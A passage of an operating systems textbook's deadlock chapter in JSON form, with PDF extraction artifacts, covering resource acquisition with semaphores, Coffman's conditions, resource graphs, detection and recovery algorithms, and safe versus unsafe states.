            "content": "6.1.2 Resource Acquisition\r\nFor some kinds of resources, such as records in a database system, it is up to\r\nthe user processes rather than the system to manage resource usage themselves.\r\nOne way of allowing this is to associate a semaphore with each resource. These\n438 DEADLOCKS CHAP. 6\r\nsemaphores are all initialized to 1. Mutexes can be used equally well. The three\r\nsteps listed above are then implemented as a down on the semaphore to acquire the\r\nresource, the use of the resource, and finally an up on the resource to release it.\r\nThese steps are shown in Fig. 6-1(a).\r\ntypedef int semaphore; typedef int semaphore;\r\nsemaphore resource 1; semaphore resource 1;\r\nsemaphore resource 2;\r\nvoid process A(void) { void process A(void) {\r\ndown(&resource 1); down(&resource 1);\r\nuse resource 1( ); down(&resource 2);\r\nup(&resource 1); use both resources( );\r\n} up(&resource 2);\r\nup(&resource 1);\r\n}\r\n(a) (b)\r\nFigure 6-1. Using a semaphore to protect resources. (a) One resource. (b) Two resources.\r\nSometimes processes need two or more resources. They can be acquired se\u0002quentially, as shown in Fig. 6-1(b). If more than two resources are needed, they\r\nare just acquired one after another.\r\nSo far, so good. As long as only one process is involved, everything works\r\nfine. Of course, with only one process, there is no need to formally acquire re\u0002sources, since there is no competition for them.\r\nNow let us consider a situation with two processes, A and B, and two re\u0002sources. Two scenarios are depicted in Fig. 6-2. In Fig. 6-2(a), both processes ask\r\nfor the resources in the same order. In Fig. 6-2(b), they ask for them in a different\r\norder. This difference may seem minor, but it is not.\r\nIn Fig. 6-2(a), one of the processes will acquire the first resource before the\r\nother one. That process will then successfully acquire the second resource and do\r\nits work. If the other process attempts to acquire resource 1 before it has been re\u0002leased, the other process will simply block until it becomes available.\r\nIn Fig. 6-2(b), the situation is different. It might happen that one of the proc\u0002esses acquires both resources and effectively blocks out the other process until it is\r\ndone. However, it might also happen that process A acquires resource 1 and proc\u0002ess B acquires resource 2. Each one will now block when trying to acquire the\r\nother one. Neither process will ever run again. Bad news: this situation is a dead\u0002lock.\r\nHere we see how what appears to be a minor difference in coding style—\r\nwhich resource to acquire first—turns out to make the difference between the pro\u0002gram working and the program failing in a hard-to-detect way. Because deadlocks\r\ncan occur so easily, a lot of research has gone into ways to deal with them. This\r\nchapter discusses deadlocks in detail and what can be done about them.\nSEC."
          }
        }
      },
      "6.2 INTRODUCTION TO DEADLOCKS": {
        "page": 470,
        "children": {
          "6.2.1 Conditions for Resource Deadlocks": {
            "page": 471,
            "content": "6.2.1 Conditions for Resource Deadlocks\r\nCoffman et al. (1971) showed that four conditions must hold for there to be a\r\n(resource) deadlock:\r\n1. Mutual exclusion condition. Each resource is either currently assign\u0002ed to exactly one process or is available.\r\n2. Hold-and-wait condition. Processes currently holding resources that\r\nwere granted earlier can request new resources.\r\n3. No-preemption condition. Resources previously granted cannot be\r\nforcibly taken away from a process. They must be explicitly released\r\nby the process holding them.\r\n4. Circular wait condition. There must be a circular list of two or more\r\nprocesses, each of which is waiting for a resource held by the next\r\nmember of the chain.\r\nAll four of these conditions must be present for a resource deadlock to occur. If\r\none of them is absent, no resource deadlock is possible.\r\nIt is worth noting that each condition relates to a policy that a system can have\r\nor not have. Can a given resource be assigned to more than one process at once?\r\nCan a process hold a resource and ask for another? Can resources be preempted?\r\nCan circular waits exist? Later on we will see how deadlocks can be attacked by\r\ntrying to negate some of these conditions."
          },
          "6.2.2 Deadlock Modeling": {
            "page": 471,
            "content": "6.2.2 Deadlock Modeling\r\nHolt (1972) showed how these four conditions can be modeled using directed\r\ngraphs. The graphs have two kinds of nodes: processes, shown as circles, and re\u0002sources, shown as squares. A directed arc from a resource node (square) to a proc\u0002ess node (circle) means that the resource has previously been requested by, granted\r\nto, and is currently held by that process. In Fig. 6-3(a), resource R is currently as\u0002signed to process A.\r\nA directed arc from a process to a resource means that the process is currently\r\nblocked waiting for that resource. In Fig. 6-3(b), process B is waiting for resource\r\nS. In Fig. 6-3(c) we see a deadlock: process C is waiting for resource T, which is\r\ncurrently held by process D. Process D is not about to release resource T because\r\nit is waiting for resource U, held by C. Both processes will wait forever. A cycle\r\nin the graph means that there is a deadlock involving the processes and resources in\r\nthe cycle (assuming that there is one resource of each kind). In this example, the\r\ncycle is C − T − D − U − C.\r\nNow let us look at an example of how resource graphs can be used. Imagine\r\nthat we have three processes, A, B, and C, and three resources, R, S, and T. The\nSEC. 6.2 INTRODUCTION TO DEADLOCKS 441\r\n(a) (b) (c)\r\nT U\r\nD\r\nC\r\nS\r\nB\r\nA\r\nR\r\nFigure 6-3. Resource allocation graphs. (a) Holding a resource. (b) Requesting\r\na resource. (c) Deadlock.\r\nrequests and releases of the three processes are given in Fig. 6-4(a)–(c). The oper\u0002ating system is free to run any unblocked process at any instant, so it could decide\r\nto run A until A finished all its work, then run B to completion, and finally run C.\r\nThis ordering does not lead to any deadlocks (because there is no competition\r\nfor resources) but it also has no parallelism at all. In addition to requesting and\r\nreleasing resources, processes compute and do I/O. When the processes are run se\u0002quentially, there is no possibility that while one process is waiting for I/O, another\r\ncan use the CPU. Thus, running the processes strictly sequentially may not be\r\noptimal. On the other hand, if none of the processes does any I/O at all, shortest\r\njob first is better than round robin, so under some circumstances running all proc\u0002esses sequentially may be the best way.\r\nLet us now suppose that the processes do both I/O and computing, so that\r\nround robin is a reasonable scheduling algorithm. The resource requests might oc\u0002cur in the order of Fig. 6-4(d). If these six requests are carried out in that order, the\r\nsix resulting resource graphs are asshown in Fig. 6-4(e)–(j). After request 4 has\r\nbeen made, A blocks waiting for S, as shown in Fig. 6-4(h). In the next two steps B\r\nand C also block, ultimately leading to a cycle and the deadlock of Fig. 6-4(j).\r\nHowever, as we hav e already mentioned, the operating system is not required\r\nto run the processes in any special order. In particular, if granting a particular re\u0002quest might lead to deadlock, the operating system can simply suspend the process\r\nwithout granting the request (i.e., just not schedule the process) until it is safe. In\r\nFig. 6-4, if the operating system knew about the impending deadlock, it could sus\u0002pend B instead of granting it S. By running only A and C, we would get the re\u0002quests and releases of Fig. 6-4(k) instead of Fig. 6-4(d). This sequence leads to the\r\nresource graphs of Fig. 6-4(l)–(q), which do not lead to deadlock.\r\nAfter step (q), process B can be granted S because A is finished and C has\r\nev erything it needs. Even if B blocks when requesting T, no deadlock can occur. B\r\nwill just wait until C is finished.\r\nLater in this chapter we will study a detailed algorithm for making allocation\r\ndecisions that do not lead to deadlock. For the moment, the point to understand is\r\nthat resource graphs are a tool that lets us see if a given request/release sequence\n442 DEADLOCKS CHAP. 6\r\n(j)\r\n A\r\nRequest R\r\nRequest S\r\nRelease R\r\nRelease S\r\n B\r\nRequest S\r\nRequest T\r\nRelease S\r\nRelease T\r\n C\r\nRequest T\r\nRequest R\r\nRelease T\r\nRelease R\r\n1. A requests R\r\n2. B requests S\r\n3. C requests T\r\n4. A requests S\r\n5. B requests T\r\n6. C requests R\r\n deadlock\r\n1. A requests R\r\n2. C requests T\r\n3. A requests S\r\n4. C requests R\r\n5. A releases R\r\n6. A releases S\r\n no deadlock\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(i)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(h)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(g)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(f)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(d) (e)\r\n(a) (b) (c)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(q)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(p)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(o)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(n)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(m)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\n(k) (l)\r\nA\r\nR\r\nB\r\nS\r\nC\r\nT\r\nFigure 6-4. An example of how deadlock occurs and how it can be avoided.\nSEC. 6.2 INTRODUCTION TO DEADLOCKS 443\r\nleads to deadlock. We just carry out the requests and releases step by step, and\r\nafter every step we check the graph to see if it contains any cycles. If so, we have a\r\ndeadlock; if not, there is no deadlock. Although our treatment of resource graphs\r\nhas been for the case of a single resource of each type, resource graphs can also be\r\ngeneralized to handle multiple resources of the same type (Holt, 1972).\r\nIn general, four strategies are used for dealing with deadlocks.\r\n1. Just ignore the problem. Maybe if you ignore it, it will ignore you.\r\n2. Detection and recovery. Let them occur, detect them, and take action.\r\n3. Dynamic avoidance by careful resource allocation.\r\n4. Prevention, by structurally negating one of the four conditions.\r\nIn the next four sections, we will examine each of these methods in turn."
          }
        }
      },
      "6.3 THE OSTRICH ALGORITHM": {
        "page": 474,
        "content": "6.3 THE OSTRICH ALGORITHM\r\nThe simplest approach is the ostrich algorithm: stick your head in the sand and\r\npretend there is no problem.† People react to this strategy in different ways. Math\u0002ematicians find it unacceptable and say that deadlocks must be prevented at all\r\ncosts. Engineers ask how often the problem is expected, how often the system\r\ncrashes for other reasons, and how serious a deadlock is. If deadlocks occur on the\r\nav erage once every fiv e years, but system crashes due to hardware failures and op\u0002erating system bugs occur once a week, most engineers would not be willing to\r\npay a large penalty in performance or convenience to eliminate deadlocks.\r\nTo make this contrast more specific, consider an operating system that blocks\r\nthe caller when an open system call on a physical device such as a Blu-ray driver\r\nor a printer cannot be carried out because the device is busy. Typically it is up to\r\nthe device driver to decide what action to take under such circumstances. Blocking\r\nor returning an error code are two obvious possibilities. If one process suc\u0002cessfully opens the Blu-ray drive and another successfully opens the printer and\r\nthen each process tries to open the other one and blocks trying, we have a dead\u0002lock. Few current systems will detect this."
      },
      "6.4 DEADLOCK DETECTION AND RECOVERY": {
        "page": 474,
        "children": {
          "6.4.1 Deadlock Detection with One Resource of Each Type": {
            "page": 475,
            "content": "6.4.1 Deadlock Detection with One Resource of Each Type\r\nLet us begin with the simplest case: there is only one resource of each type.\r\nSuch a system might have one scanner, one Blu-ray recorder, one plotter, and one\r\ntape drive, but no more than one of each class of resource. In other words, we are\r\nexcluding systems with two printers for the moment. We will treat them later,\r\nusing a different method.\r\nFor such a system, we can construct a resource graph of the sort illustrated in\r\nFig. 6-3. If this graph contains one or more cycles, a deadlock exists. Any process\r\nthat is part of a cycle is deadlocked. If no cycles exist, the system is not dead\u0002locked.\r\nAs an example of a system more complex than those we have looked at so far,\r\nconsider a system with seven processes, A though G, and six resources, R through\r\nW. The state of which resources are currently owned and which ones are currently\r\nbeing requested is as follows:\r\n1. Process A holds R and wants S.\r\n2. Process B holds nothing but wants T.\r\n3. Process C holds nothing but wants S.\r\n4. Process D holds U and wants S and T.\r\n5. Process E holds T and wants V.\r\n6. Process F holds W and wants S.\r\n7. Process G holds V and wants U.\r\nThe question is: ‘‘Is this system deadlocked, and if so, which processes are in\u0002volved?’’\r\nTo answer this question, we can construct the resource graph of Fig. 6-5(a).\r\nThis graph contains one cycle, which can be seen by visual inspection. The cycle\r\nis shown in Fig. 6-5(b). From this cycle, we can see that processes D, E, and G are\r\nall deadlocked. Processes A, C, and F are not deadlocked because S can be allo\u0002cated to any one of them, which then finishes and returns it. Then the other two\r\ncan take it in turn and also complete. (Note that to make this example more inter\u0002esting we have allowed processes, namely D, to ask for two resources at once.)\r\nAlthough it is relatively simple to pick out the deadlocked processes by visual\r\ninspection from a simple graph, for use in actual systems we need a formal algo\u0002rithm for detecting deadlocks. Many algorithms for detecting cycles in directed\r\ngraphs are known. Below we will give a simple one that inspects a graph and ter\u0002minates either when it has found a cycle or when it has shown that none exists. It\nSEC. 6.4 DEADLOCK DETECTION AND RECOVERY 445\r\nR\r\nS T T\r\nU V U V\r\nW\r\nC D E D E\r\nG G\r\nA\r\nF\r\nB\r\n(a) (b)\r\nFigure 6-5. (a) A resource graph. (b) A cycle extracted from (a).\r\nuses one dynamic data structure, L, a list of nodes, as well as a list of arcs. During\r\nthe algorithm, to prevent repeated inspections, arcs will be marked to indicate that\r\nthey hav e already been inspected,\r\nThe algorithm operates by carrying out the following steps as specified:\r\n1. For each node, N, in the graph, perform the following fiv e steps with\r\nN as the starting node.\r\n2. Initialize L to the empty list, and designate all the arcs as unmarked.\r\n3. Add the current node to the end of L and check to see if the node now\r\nappears in L two times. If it does, the graph contains a cycle (listed in\r\nL) and the algorithm terminates.\r\n4. From the given node, see if there are any unmarked outgoing arcs. If\r\nso, go to step 5; if not, go to step 6.\r\n5. Pick an unmarked outgoing arc at random and mark it. Then follow it\r\nto the new current node and go to step 3.\r\n6. If this node is the initial node, the graph does not contain any cycles\r\nand the algorithm terminates. Otherwise, we have now reached a\r\ndead end. Remove it and go back to the previous node, that is, the\r\none that was current just before this one, make that one the current\r\nnode, and go to step 3.\r\nWhat this algorithm does is take each node, in turn, as the root of what it hopes\r\nwill be a tree, and do a depth-first search on it. If it ever comes back to a node it\r\nhas already encountered, then it has found a cycle. If it exhausts all the arcs from\r\nany giv en node, it backtracks to the previous node. If it backtracks to the root and\r\ncannot go further, the subgraph reachable from the current node does not contain\n446 DEADLOCKS CHAP. 6\r\nany cycles. If this property holds for all nodes, the entire graph is cycle free, so the\r\nsystem is not deadlocked.\r\nTo see how the algorithm works in practice, let us use it on the graph of\r\nFig. 6-5(a). The order of processing the nodes is arbitrary, so let us just inspect\r\nthem from left to right, top to bottom, first running the algorithm starting at R, then\r\nsuccessively A, B, C, S, D, T, E, F, and so forth. If we hit a cycle, the algorithm\r\nstops.\r\nWe start at R and initialize L to the empty list. Then we add R to the list and\r\nmove to the only possibility, A, and add it to L, giving L = [R, A]. From A we go\r\nto S, giving L = [R, A, S ]. S has no outgoing arcs, so it is a dead end, forcing us to\r\nbacktrack to A. Since A has no unmarked outgoing arcs, we backtrack to R, com\u0002pleting our inspection of R.\r\nNow we restart the algorithm starting at A, resetting L to the empty list. This\r\nsearch, too, quickly stops, so we start again at B. From B we continue to follow\r\noutgoing arcs until we get to D, at which time L = [B, T, E, V, G, U, D]. Now we\r\nmust make a (random) choice. If we pick S we come to a dead end and backtrack\r\nto D. The second time we pick T and update L to be [B, T, E, V, G, U, D, T ], at\r\nwhich point we discover the cycle and stop the algorithm.\r\nThis algorithm is far from optimal. For a better one, see Even (1979). Never\u0002theless, it demonstrates that an algorithm for deadlock detection exists."
          },
          "6.4.2 Deadlock Detection with Multiple Resources of Each Type": {
            "page": 477,
            "content": "6.4.2 Deadlock Detection with Multiple Resources of Each Type\r\nWhen multiple copies of some of the resources exist, a different approach is\r\nneeded to detect deadlocks. We will now present a matrix-based algorithm for de\u0002tecting deadlock among n processes, P1 through Pn. Let the number of resource\r\nclasses be m, with E1 resources of class 1, E2 resources of class 2, and generally,\r\nEi resources of class i (1 ≤ i ≤ m). E is the existing resource vector. It giv es the\r\ntotal number of instances of each resource in existence. For example, if class 1 is\r\ntape drives, then E1 = 2 means the system has two tape drives.\r\nAt any instant, some of the resources are assigned and are not available. Let A\r\nbe the av ailable resource vector, with Ai giving the number of instances of re\u0002source i that are currently available (i.e., unassigned). If both of our two tape\r\ndrives are assigned, A1 will be 0.\r\nNow we need two arrays, C, the current allocation matrix, and R, the request\r\nmatrix. The ith row of C tells how many instances of each resource class Pi cur\u0002rently holds. Thus, Cij is the number of instances of resource j that are held by\r\nprocess i. Similarly, Rij is the number of instances of resource j that Pi wants.\r\nThese four data structures are shown in Fig. 6-6.\r\nAn important invariant holds for these four data structures. In particular, every\r\nresource is either allocated or is available. This observation means that\r\nn\r\ni=1\r\nΣ Cij + Aj = E j\nSEC. 6.4 DEADLOCK DETECTION AND RECOVERY 447\r\nResources in existence\r\n(E1, E2, E3, …, Em)\r\nCurrent allocation matrix\r\nC11\r\nC21\r\nCn1\r\nC12\r\nC22\r\nCn2\r\nC13\r\nC23\r\nCn3\r\nC1m\r\nC2m\r\nCnm\r\nRow n is current allocation\r\nto process n\r\nResources available\r\n(A1, A2, A3, …, Am)\r\nRequest matrix\r\nR11\r\nR21\r\nRn1\r\nR12\r\nR22\r\nRn2\r\nR13\r\nR23\r\nRn3\r\nR1m\r\nR2m\r\nRnm\r\nRow 2 is what process 2 needs\r\nFigure 6-6. The four data structures needed by the deadlock detection algorithm.\r\nIn other words, if we add up all the instances of the resource j that have been allo\u0002cated and to this add all the instances that are available, the result is the number of\r\ninstances of that resource class that exist.\r\nThe deadlock detection algorithm is based on comparing vectors. Let us\r\ndefine the relation A ≤ B on two vectors A and B to mean that each element of A is\r\nless than or equal to the corresponding element of B. Mathematically, A ≤ B holds\r\nif and only if Ai ≤ Bi for 1 ≤ i ≤ m.\r\nEach process is initially said to be unmarked. As the algorithm progresses,\r\nprocesses will be marked, indicating that they are able to complete and are thus not\r\ndeadlocked. When the algorithm terminates, any unmarked processes are known\r\nto be deadlocked. This algorithm assumes a worst-case scenario: all processes\r\nkeep all acquired resources until they exit.\r\nThe deadlock detection algorithm can now be giv en as follows.\r\n1. Look for an unmarked process, Pi, for which the ith row of R is less\r\nthan or equal to A.\r\n2. If such a process is found, add the ith row of C to A, mark the process,\r\nand go back to step 1.\r\n3. If no such process exists, the algorithm terminates.\r\nWhen the algorithm finishes, all the unmarked processes, if any, are deadlocked.\r\nWhat the algorithm is doing in step 1 is looking for a process that can be run to\r\ncompletion. Such a process is characterized as having resource demands that can\r\nbe met by the currently available resources. The selected process is then run until\r\nit finishes, at which time it returns the resources it is holding to the pool of avail\u0002able resources. It is then marked as completed. If all the processes are ultimately\r\nable to run to completion, none of them are deadlocked. If some of them can never\n448 DEADLOCKS CHAP. 6\r\nfinish, they are deadlocked. Although the algorithm is nondeterministic (because it\r\nmay run the processes in any feasible order), the result is always the same.\r\nAs an example of how the deadlock detection algorithm works, see Fig. 6-7.\r\nHere we have three processes and four resource classes, which we have arbitrarily\r\nlabeled tape drives, plotters, scanners, and Blu-ray drives. Process 1 has one scan\u0002ner. Process 2 has two tape drives and a Blu-ray drive. Process 3 has a plotter and\r\ntwo scanners. Each process needs additional resources, as shown by the R matrix.\r\nTape drives\r\nPlotters\r\nScanners\r\nBlu-rays\r\nTape drives\r\nPlotters\r\nScanners\r\nBlu-rays\r\nE = ( 4 2 3 1 )\r\nCurrent allocation matrix Request matrix\r\nA = ( 2 1 0 0 )\r\nC =\r\n0 0 1 0\r\n2 0 0 1\r\n0 1 2 0\r\nR =\r\n2 0 0 1\r\n1 0 1 0\r\n2 1 0 0\r\nFigure 6-7. An example for the deadlock detection algorithm.\r\nTo run the deadlock detection algorithm, we look for a process whose resource\r\nrequest can be satisfied. The first one cannot be satisfied because there is no Blu\u0002ray drive available. The second cannot be satisfied either, because there is no scan\u0002ner free. Fortunately, the third one can be satisfied, so process 3 runs and eventual\u0002ly returns all its resources, giving\r\nA = (2 2 2 0)\r\nAt this point process 2 can run and return its resources, giving\r\nA = (4 2 2 1)\r\nNow the remaining process can run. There is no deadlock in the system.\r\nNow consider a minor variation of the situation of Fig. 6-7. Suppose that proc\u0002ess 3 needs a Blu-ray drive as well as the two tape drives and the plotter. None of\r\nthe requests can be satisfied, so the entire system will eventually be deadlocked.\r\nEven if we give process 3 its two tape drives and one plotter, the system deadlocks\r\nwhen it requests the Blu-ray drive.\r\nNow that we know how to detect deadlocks (at least with static resource re\u0002quests known in advance), the question of when to look for them comes up. One\r\npossibility is to check every time a resource request is made. This is certain to\r\ndetect them as early as possible, but it is potentially expensive in terms of CPU\r\ntime. An alternative strategy is to check every k minutes, or perhaps only when the\r\nCPU utilization has dropped below some threshold. The reason for considering the\r\nCPU utilization is that if enough processes are deadlocked, there will be few run\u0002nable processes, and the CPU will often be idle.\nSEC. 6.4 DEADLOCK DETECTION AND RECOVERY 449"
          },
          "6.4.3 Recovery from Deadlock": {
            "page": 480,
            "content": "6.4.3 Recovery from Deadlock\r\nSuppose that our deadlock detection algorithm has succeeded and detected a\r\ndeadlock. What next? Some way is needed to recover and get the system going\r\nagain. In this section we will discuss various ways of recovering from deadlock.\r\nNone of them are especially attractive, howev er.\r\nRecovery through Preemption\r\nIn some cases it may be possible to temporarily take a resource away from its\r\ncurrent owner and give it to another process. In many cases, manual intervention\r\nmay be required, especially in batch-processing operating systems running on\r\nmainframes.\r\nFor example, to take a laser printer away from its owner, the operator can col\u0002lect all the sheets already printed and put them in a pile. Then the process can be\r\nsuspended (marked as not runnable). At this point the printer can be assigned to\r\nanother process. When that process finishes, the pile of printed sheets can be put\r\nback in the printer’s output tray and the original process restarted.\r\nThe ability to take a resource away from a process, have another process use it,\r\nand then give it back without the process noticing it is highly dependent on the\r\nnature of the resource. Recovering this way is frequently difficult or impossible.\r\nChoosing the process to suspend depends largely on which ones have resources\r\nthat can easily be taken back.\r\nRecovery through Rollback\r\nIf the system designers and machine operators know that deadlocks are likely,\r\nthey can arrange to have processes checkpointed periodically. Checkpointing a\r\nprocess means that its state is written to a file so that it can be restarted later. The\r\ncheckpoint contains not only the memory image, but also the resource state, in\r\nother words, which resources are currently assigned to the process. To be most ef\u0002fective, new checkpoints should not overwrite old ones but should be written to\r\nnew files, so as the process executes, a whole sequence accumulates.\r\nWhen a deadlock is detected, it is easy to see which resources are needed. To\r\ndo the recovery, a process that owns a needed resource is rolled back to a point in\r\ntime before it acquired that resource by starting at one of its earlier checkpoints.\r\nAll the work done since the checkpoint is lost (e.g., output printed since the check\u0002point must be discarded, since it will be printed again). In effect, the process is\r\nreset to an earlier moment when it did not have the resource, which is now assign\u0002ed to one of the deadlocked processes. If the restarted process tries to acquire the\r\nresource again, it will have to wait until it becomes available.\n450 DEADLOCKS CHAP. 6\r\nRecovery through Killing Processes\r\nThe crudest but simplest way to break a deadlock is to kill one or more proc\u0002esses. One possibility is to kill a process in the cycle. With a little luck, the other\r\nprocesses will be able to continue. If this does not help, it can be repeated until the\r\ncycle is broken.\r\nAlternatively, a process not in the cycle can be chosen as the victim in order to\r\nrelease its resources. In this approach, the process to be killed is carefully chosen\r\nbecause it is holding resources that some process in the cycle needs. For example,\r\none process might hold a printer and want a plotter, with another process holding a\r\nplotter and wanting a printer. These two are deadlocked. A third process may hold\r\nanother identical printer and another identical plotter and be happily running. Kill\u0002ing the third process will release these resources and break the deadlock involving\r\nthe first two.\r\nWhere possible, it is best to kill a process that can be rerun from the beginning\r\nwith no ill effects. For example, a compilation can always be rerun because all it\r\ndoes is read a source file and produce an object file. If it is killed partway through,\r\nthe first run has no influence on the second run.\r\nOn the other hand, a process that updates a database cannot always be run a\r\nsecond time safely. If the process adds 1 to some field of a table in the database,\r\nrunning it once, killing it, and then running it again will add 2 to the field, which is\r\nincorrect.\r\n6.5 DEADLOCK AV OIDANCE\r\nIn the discussion of deadlock detection, we tacitly assumed that when a proc\u0002ess asks for resources, it asks for them all at once (the R matrix of Fig. 6-6). In\r\nmost systems, however, resources are requested one at a time. The system must be\r\nable to decide whether granting a resource is safe or not and make the allocation\r\nonly when it is safe. Thus, the question arises: Is there an algorithm that can al\u0002ways avoid deadlock by making the right choice all the time? The answer is a\r\nqualified yes—we can avoid deadlocks, but only if certain information is available\r\nin advance. In this section we examine ways to avoid deadlock by careful resource\r\nallocation.\r\n6.5.1 Resource Trajectories\r\nThe main algorithms for deadlock avoidance are based on the concept of safe\r\nstates. Before describing them, we will make a slight digression to look at the con\u0002cept of safety in a graphic and easy-to-understand way. Although the graphical ap\u0002proach does not translate directly into a usable algorithm, it gives a good intuitive\r\nfeel for the nature of the problem."
          }
        }
      },
      "6.5 DEADLOCK AVOIDANCE": {
        "page": 481,
        "children": {
          "6.5.1 Resource Trajectories": {
            "page": 481,
            "content": "6.5.1 Resource Trajectories\r\nThe main algorithms for deadlock avoidance are based on the concept of safe\r\nstates. Before describing them, we will make a slight digression to look at the con\u0002cept of safety in a graphic and easy-to-understand way. Although the graphical ap\u0002proach does not translate directly into a usable algorithm, it gives a good intuitive\r\nfeel for the nature of the problem.\nSEC. 6.5 DEADLOCK AVOIDANCE 451\r\nIn Fig. 6-8 we see a model for dealing with two processes and two resources,\r\nfor example, a printer and a plotter. The horizontal axis represents the number of\r\ninstructions executed by process A. The vertical axis represents the number of in\u0002structions executed by process B. At I1 A requests a printer; at I2 it needs a plotter.\r\nThe printer and plotter are released at I3 and I4, respectively. Process B needs the\r\nplotter from I5 to I7 and the printer from I6 to I8.\r\nPlotter\r\nPrinter\r\nPrinter\r\nPlotter\r\nB\r\nA\r\nu (Both processes\r\nfinished)\r\np q\r\nr\r\ns\r\nt\r\nI8\r\nI7\r\nI6\r\nI5\r\nI1 I2I3 I4\r\n\r\n\r\n\r\nFigure 6-8. Tw o process resource trajectories.\r\nEvery point in the diagram represents a joint state of the two processes. Ini\u0002tially, the state is at p, with neither process having executed any instructions. If the\r\nscheduler chooses to run A first, we get to the point q, in which A has executed\r\nsome number of instructions, but B has executed none. At point q the trajectory\r\nbecomes vertical, indicating that the scheduler has chosen to run B. With a single\r\nprocessor, all paths must be horizontal or vertical, never diagonal. Furthermore,\r\nmotion is always to the north or east, never to the south or west (because processes\r\ncannot run backward in time, of course).\r\nWhen A crosses the I1 line on the path from r to s, it requests and is granted\r\nthe printer. When B reaches point t, it requests the plotter.\r\nThe regions that are shaded are especially interesting. The region with lines\r\nslanting from southwest to northeast represents both processes having the printer.\r\nThe mutual exclusion rule makes it impossible to enter this region. Similarly, the\r\nregion shaded the other way represents both processes having the plotter and is\r\nequally impossible.\r\nIf the system ever enters the box bounded by I1 and I2 on the sides and I5 and\r\nI6 top and bottom, it will eventually deadlock when it gets to the intersection of I2\r\nand I6. At this point, A is requesting the plotter and B is requesting the printer, and\r\nboth are already assigned. The entire box is unsafe and must not be entered. At\n452 DEADLOCKS CHAP. 6\r\npoint t the only safe thing to do is run process A until it gets to I4. Beyond that,\r\nany trajectory to u will do.\r\nThe important thing to see here is that at point t, B is requesting a resource.\r\nThe system must decide whether to grant it or not. If the grant is made, the system\r\nwill enter an unsafe region and eventually deadlock. To avoid the deadlock, B\r\nshould be suspended until A has requested and released the plotter."
          },
          "6.5.2 Safe and Unsafe States": {
            "page": 483,
            "content": "6.5.2 Safe and Unsafe States\r\nThe deadlock avoidance algorithms that we will study use the information of\r\nFig. 6-6. At any instant of time, there is a current state consisting of E, A, C, and\r\nR. A state is said to be safe if there is some scheduling order in which every proc\u0002ess can run to completion even if all of them suddenly request their maximum\r\nnumber of resources immediately. It is easiest to illustrate this concept by an ex\u0002ample using one resource. In Fig. 6-9(a) we have a state in which A has three\r\ninstances of the resource but may need as many as nine eventually. B currently has\r\ntwo and may need four altogether, later. Similarly, C also has two but may need an\r\nadditional fiv e. A total of 10 instances of the resource exist, so with seven re\u0002sources already allocated, three there are still free.\r\nA\r\nB\r\nC\r\n3\r\n2\r\n2\r\n9\r\n4\r\n7\r\nFree: 3\r\n(a)\r\nA\r\nB\r\nC\r\n3\r\n4\r\n2\r\n9\r\n4\r\n7\r\nFree: 1\r\n(b)\r\nA\r\nB\r\nC\r\n3\r\n0 – –\r\n2\r\n9\r\n7\r\nFree: 5\r\n(c)\r\nA\r\nB\r\nC\r\n3\r\n0\r\n7\r\n9\r\n7\r\nFree: 0\r\n(d)\r\n–\r\nA\r\nB\r\nC\r\n3\r\n0\r\n0\r\n9\r\n–\r\nFree: 7\r\n(e)\r\nHas Max Has Max Has Max Has Max Has Max\r\nFigure 6-9. Demonstration that the state in (a) is safe.\r\nThe state of Fig. 6-9(a) is safe because there exists a sequence of allocations\r\nthat allows all processes to complete. Namely, the scheduler can simply run B\r\nexclusively, until it asks for and gets two more instances of the resource, leading to\r\nthe state of Fig. 6-9(b). When B completes, we get the state of Fig. 6-9(c). Then\r\nthe scheduler can run C, leading eventually to Fig. 6-9(d). When C completes, we\r\nget Fig. 6-9(e). Now A can get the six instances of the resource it needs and also\r\ncomplete. Thus, the state of Fig. 6-9(a) is safe because the system, by careful\r\nscheduling, can avoid deadlock.\r\nNow suppose we have the initial state shown in Fig. 6-10(a), but this time A\r\nrequests and gets another resource, giving Fig. 6-10(b). Can we find a sequence\r\nthat is guaranteed to work? Let us try. The scheduler could run B until it asked for\r\nall its resources, as shown in Fig. 6-10(c).\r\nEventually, B completes and we get the state of Fig. 6-10(d). At this point we\r\nare stuck. We only have four instances of the resource free, and each of the active\nSEC. 6.5 DEADLOCK AVOIDANCE 453\r\nA\r\nB\r\nC\r\n3\r\n2\r\n2\r\n9\r\n4\r\n7\r\nFree: 3\r\n(a)\r\nA\r\nB\r\nC\r\n4\r\n2\r\n2\r\n9\r\n4\r\n7\r\nFree: 2\r\n(b)\r\nA\r\nB\r\nC\r\n4\r\n4 — 4\r\n2\r\n9\r\n7\r\nFree: 0\r\n(c)\r\nA\r\nB\r\nC\r\n4\r\n—\r\n2\r\n9\r\n7\r\nFree: 4\r\n(d)\r\nHas Max Has Max Has Max Has Max\r\nFigure 6-10. Demonstration that the state in (b) is not safe.\r\nprocesses needs fiv e. There is no sequence that guarantees completion. Thus, the\r\nallocation decision that moved the system from Fig. 6-10(a) to Fig. 6-10(b) went\r\nfrom a safe to an unsafe state. Running A or C next starting at Fig. 6-10(b) does\r\nnot work either. In retrospect, A’s request should not have been granted.\r\nIt is worth noting that an unsafe state is not a deadlocked state. Starting at\r\nFig. 6-10(b), the system can run for a while. In fact, one process can even com\u0002plete. Furthermore, it is possible that A might release a resource before asking for\r\nany more, allowing C to complete and avoiding deadlock altogether. Thus, the dif\u0002ference between a safe state and an unsafe state is that from a safe state the system\r\ncan guarantee that all processes will finish; from an unsafe state, no such guaran\u0002tee can be given."
          },
          "6.5.3 The Banker’s Algorithm for a Single Resource": {
            "page": 484,
